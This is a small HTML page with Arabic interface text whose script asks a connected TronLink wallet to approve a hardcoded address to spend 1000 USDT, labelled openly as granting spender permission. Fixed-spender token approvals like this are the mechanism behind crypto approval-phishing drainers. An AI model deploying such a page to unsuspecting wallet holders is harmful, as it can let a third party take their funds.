<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>Approve USDT TRC20</title>
</head>
<body>
  <h2>Approve USDT ()</h2>
  <button onclick="approveUSDT()">اعطِ صلاحية spender</button>

  <script>
    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    // العنوان اللي بعتته كـ spender
    const spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";

    async function approveUSDT() {
      try {
        if (!window.tronWeb) {
          alert("يرجى فتح الصفحة داخل TronLink أو محفظة تدعم tronWeb.");
          return;
        }

        // تحقق من صحة العنوان
        if (!window.tronWeb.isAddress(spenderAddress)) {
          alert("العنوان الممنوح للصلاحية (spender) غير صالح!");
          return;
        }

        // تحويل العنوان إلى صيغة Hex
        const spenderHex = window.tronWeb.address.toHex(spenderAddress);

        // إعداد العقد
        const contract = await window.tronWeb.contract([
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }
        ], usdtContractAddress);

        // قيمة الابروف - 1000 USDT (1000 * 10^6 لأن decimals = 6)
        const amount = "1000000000";

        const tx = await contract.approve(spenderHex, amount).send({
          feeLimit: 100_000_000
        });

        alert("تم إرسال المعاملة بنجاح!\nTransaction ID:\n" + tx);
        console.log("Transaction ID:", tx);

      } catch (error) {
        console.error("خطأ أثناء المعاملة:", error);
        alert("فشل تنفيذ عملية approve:\n" + (error.message || error));
      }
    }
  </script>
</body>
</html>
